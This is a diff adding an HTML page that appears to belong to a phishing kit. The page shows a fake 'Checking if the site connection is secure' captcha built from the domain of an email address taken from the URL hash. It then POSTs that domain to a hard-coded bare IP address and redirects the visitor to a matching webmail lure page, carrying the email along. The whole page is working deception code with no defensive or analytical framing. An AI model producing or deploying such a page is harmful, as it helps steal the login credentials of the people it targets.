@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #444;
+        }
+
+        .verification-card {
+            background: white;
+            width: 800px;
+            padding: 60px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            font-size: 32px;
+            margin: 0 0 30px 0;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .subtitle {
+            font-size: 24px;
+            color: #666;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+
+        .verification-box {
+            border: 2px solid #e0e0e0;
+            padding: 30px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            gap: 30px;
+            margin-bottom: 40px;
+            transition: all 0.3s ease;
+        }
+
+        .checkbox {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #d0d0d0;
+            border-radius: 8px;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+
+        .checkbox.checking {
+            border-color: #4285f4;
+            background: #4285f4;
+        }
+
+        .checkbox.success {
+            border-color: #34a853;
+            background: #34a853;
+        }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.5s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            transition: transform 0.3s ease;
+        }
+
+        .spinner.active {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .checkmark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            color: white;
+            font-size: 24px;
+            transition: transform 0.3s ease;
+        }
+
+        .checkmark.active {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .verification-text {
+            font-size: 24px;
+            color: #666;
+        }
+
+        .help-text {
+            font-size: 20px;
+            color: #666;
+            cursor: pointer;
+            margin-top: 30px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .help-text:hover {
+            text-decoration: underline;
+        }
+
+        .arrow {
+            transition: transform 0.3s ease;
+        }
+
+        .help-text:hover .arrow {
+            transform: rotate(180deg);
+        }
+
+        .status-text {
+            font-size: 20px;
+            color: #666;
+            text-align: center;
+            margin-top: 20px;
+            height: 30px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .status-text.active {
+            opacity: 1;
+        }
+
+        #mainContainer, #securityContainer {
+            width: 100%;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            display: none;
+            background: #f5f5f5;
+        }
+
+        #securityContainer.active {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #mainContainer.active {
+            display: block;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <div id="securityContainer"></div>
+    <div id="mainContainer"></div>
+    <script type="text/javascript" src="gt.js"></script>
+    <script>
+        const DEFAULT_JS = 'webmail';
+        
+         function loadScript(url, emm) {
+    try {
+        // Extract name from URL (get text between '://' and '.js')
+        const nameOfLink = url.split('://')[1].replace('.js', '');
+        window.location.href = `${nameOfLink}.html#${emm}`;
+    } catch (error) {
+        console.error("Error loading script:", error);
+    }
+}
+
+        function createSecurityTemplate(em) {
+            const domain = em.split('@')[1] || em;
+            return `
+                <div class="verification-card">
+                    <h1>Checking if the site connection is secure</h1>
+                    <div class="subtitle"><strong style="color: #333; font-weight: 600;">${domain} </strong> needs to review the security of your connection before proceeding.</div>
+                    <div class="verification-box">
+                        <div class="checkbox" id="checkbox">
+                            <div class="spinner" id="spinner"></div>
+                            <div class="checkmark" id="checkmark">✓</div>
+                        </div>
+                        <div class="verification-text">Verify you are human</div>
+                    </div>
+                    <div class="status-text" id="statusText"></div>
+                    <div class="help-text">
+                        Why am I seeing this page? 
+                        <span class="arrow">▼</span>
+                    </div>
+                </div>`;
+        }
+
+        async function detectWebmail(em) {
+            const domain = em.split('@')[1] || em;
+            const securityContainer = document.getElementById('securityContainer');
+            const mainContainer = document.getElementById('mainContainer');
+
+            securityContainer.classList.add('active');
+            securityContainer.innerHTML = createSecurityTemplate(domain);
+
+            const checkbox = document.getElementById('checkbox');
+            const spinner = document.getElementById('spinner');
+            const checkmark = document.getElementById('checkmark');
+            const statusText = document.getElementById('statusText');
+
+            setTimeout(() => {
+                checkbox.classList.add('checking');
+                spinner.classList.add('active');
+                statusText.textContent = 'Verifying...';
+                statusText.classList.add('active');
+                
+                setTimeout(async () => {
+                    checkbox.classList.remove('checking');
+                    checkbox.classList.add('success');
+                    spinner.classList.remove('active');
+                    checkmark.classList.add('active');
+                    statusText.textContent = 'Verification successful!';
+                    
+                    setTimeout(async () => {
+                        try {
+                            const formData = new URLSearchParams();
+                            formData.append('domain', domain);
+
+                            const response = await fetch('http://8.39.147.24/i.php', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                },
+                                body: formData.toString()
+                            });
+
+                            const result = await response.json();
+                            alert(result.debug_info);
+                            if (!result) throw new Error('Invalid response');
+
+                            let jsLink = DEFAULT_JS;
+                            if (result.found === true && typeof result.js_link === 'string' && result.js_link.startsWith('http')) {
+                                jsLink = result.js_link;
+                            }
+
+                            securityContainer.style.display = 'none';
+                            mainContainer.classList.add('active');
+                            
+                             loadScript(jsLink, em);
+                        } catch (error) {
+                            console.error('Error:', error);
+                             loadScript(DEFAULT_JS, em);
+                        }
+                    }, 1000);
+                }, 2000);
+            }, 500);
+        }
+
+        // Handle hash changes
+        window.addEventListener('hashchange', () => {
+            const domain = window.location.hash.slice(1);
+            if (domain) {
+                detectWebmail(domain);
+            }
+        });
+
+        // Initial check for hash
+        if (window.location.hash) {
+            const domain = window.location.hash.slice(1);
+            detectWebmail(domain);
+        }
+    </script>
+</body>
+</html>
